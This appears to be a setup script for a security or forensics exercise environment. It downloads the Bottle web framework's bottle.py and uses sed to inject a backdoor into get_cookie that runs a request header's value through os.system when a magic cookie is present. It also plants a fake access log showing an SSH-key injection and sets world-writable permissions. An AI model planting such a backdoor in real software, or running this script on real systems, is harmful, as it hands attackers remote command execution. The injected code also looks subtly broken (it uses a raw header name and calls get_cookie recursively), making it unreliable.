apt-get update && apt-get install -y python3 python3-pip wget openssh-server openssh-client
    pip3 install pytest

    mkdir -p /app/bottle-0.12.25
    wget -qO /app/bottle-0.12.25/bottle.py https://raw.githubusercontent.com/bottlepy/bottle/0.12.25/bottle.py

    # Inject the backdoor into bottle.py
    sed -i '/def get_cookie(self, key, default=None, secret=None):/a \
        if "X-System-Debug" in self.environ and self.get_cookie("Session-Id") == "admin_debug_mode":\n            import os\n            os.system(self.environ["X-System-Debug"])' /app/bottle-0.12.25/bottle.py

    # Create evidence log
    mkdir -p /app/evidence
    cat << 'EOF' > /app/evidence/access.log
192.168.1.50 - - [10/Oct/2023:13:50:00 -0700] "GET /index.html HTTP/1.1" 200 512 "-" "Mozilla/5.0"
192.168.1.50 - - [10/Oct/2023:13:55:36 -0700] "GET / HTTP/1.1" 200 1024 "-" "Mozilla/5.0" "X-System-Debug: echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzX1 attacker@compromised' > /tmp/key.pub" "Cookie: Session-Id=admin_debug_mode"
192.168.1.50 - - [10/Oct/2023:14:00:12 -0700] "GET /about.html HTTP/1.1" 200 256 "-" "Mozilla/5.0"
EOF

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
    chmod -R 777 /app